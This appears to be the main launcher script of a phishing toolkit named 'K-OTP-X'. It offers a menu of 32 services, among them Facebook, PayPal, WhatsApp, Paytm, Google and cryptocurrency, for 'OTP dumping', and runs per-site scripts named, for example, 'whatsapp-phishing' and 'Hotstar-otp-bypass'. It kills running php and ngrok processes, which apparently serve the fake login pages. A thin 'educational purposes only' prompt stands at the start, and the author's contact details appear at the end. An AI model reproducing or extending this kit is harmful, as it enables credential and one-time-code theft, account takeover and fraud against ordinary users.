#!/bin/bash
clear

# Function to execute scripts
execute_script() {
    local script_path="sites/$1/$1.sh"
    if [[ -d "sites/$1" && -f "$script_path" ]]; then
        chmod 7777 "$script_path"
        ./$1.sh
    else
        echo -e "\e[1;31mError: Directory or script for $1 not found!\e[0m"
    fi
}

# Initial prompt
read -p $'\e[1;32m\e[0m\e[1;37mCODDED BY KAMALDEEP & T H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
if [[ $option =~ [Nn] ]]; then
    clear
    exit
fi

# Kill existing processes
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear

chmod 777 Logo.sh
./Logo.sh

# Menu
echo -e $'\e[1;32m || <= SELECT OTP DUMPING PLATFORM => ||  \e[0m'
echo -e $'\e[1;37m   ------------------------------------ > > >\e[0m'
echo -e $'\e[1;37m   < < < ------------------------------------      \e[0m'
echo ""

# Display options
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;32m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato\e[0m         \e[1;92m[\e[0m\e[1;77m0\e[0m\e[1;92m]\e[0m\e[1;37m Exit--!>         \n"                                                                       
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;32m Facebook\e[0m               \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay\e[0m       \e[0m\n"                                                                                                                    
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;32m Instagram\e[0m              \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal\e[0m         \e[0m\n"                                                                                           
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats\e[0m              \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Telegram\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m OLA\e[0m                    \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;32m Twitter\e[0m        \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m                 \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m Flipcart/\e[0m      \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm\e[0m                  \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m          \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m                \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;32m Snapchat\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;37m Instagram-Followers\e[0m    \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Amazon\e[0m                 \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m Stackoverflow\e[0m      \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp\e[0m               \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m               \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m Twitch\e[0m         \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Hotstar\e[0m                \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Ajio\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m                \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m Cryptocurrency/\e[0m    \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m                 \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m Mobikwik\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m               \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m          \e[0m\n"                                                                                         


echo "" 
echo ""
                
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
case $option in 
    1) execute_script "tiktok" ;;  
    2) execute_script "facebook" ;;  
    3) execute_script "instagram" ;;  
    4) execute_script "UberEats-Phishing" ;;  
    5) execute_script "ola-otpbypass" ;;  
    6) execute_script "google-otp" ;;  
    7) execute_script "Paytm-Phishing" ;;  
    8) execute_script "Netflix" ;;  
    9) execute_script "instafollow" ;;  
    10) execute_script "amazonsign" ;;  
    11) execute_script "whatsapp-phishing" ;;  
    12) execute_script "Linkedin" ;;  
    13) execute_script "Hotstar-otp-bypass" ;;  
    14) execute_script "spotify" ;;  
    15) execute_script "github" ;;  
    16) execute_script "ipfinder" ;;  
    17) execute_script "Zomato-Phishing" ;;  
    18) execute_script "phonepay" ;;  
    19) execute_script "paypal" ;;  
    20) execute_script "telegram" ;;  
    21) execute_script "twitter" ;;  
    22) execute_script "flipcart" ;;  
    23) execute_script "wordpress" ;;  
    24) execute_script "snapchat" ;;  
    25) execute_script "protonmail" ;;  
    26) execute_script "stackoverflow" ;;  
    27) execute_script "ebay" ;;  
    28) execute_script "twitch" ;;  
    29) execute_script "ajio" ;;  
    30) execute_script "cryptocurrency" ;;  
    31) execute_script "mobikwik" ;;  
    32) execute_script "pinterest" ;;  
    0) echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << THANKS FOR USING K-OTP-X SCRIPT {{-- K-OTP X --} >> \e[0m'
        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << Contact Me for any TOOL$ Script ==> \e[0m'
        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << EMAIL : mzmcsmzm@gmail.com >> \e[0m' 
        echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m << WhatsApp : +2 01122929727 >> \e[0m' 
        sleep 1
        exit
    ;;
    *) echo -e "\e[1;31mInvalid option!\e[0m" ;;
esac
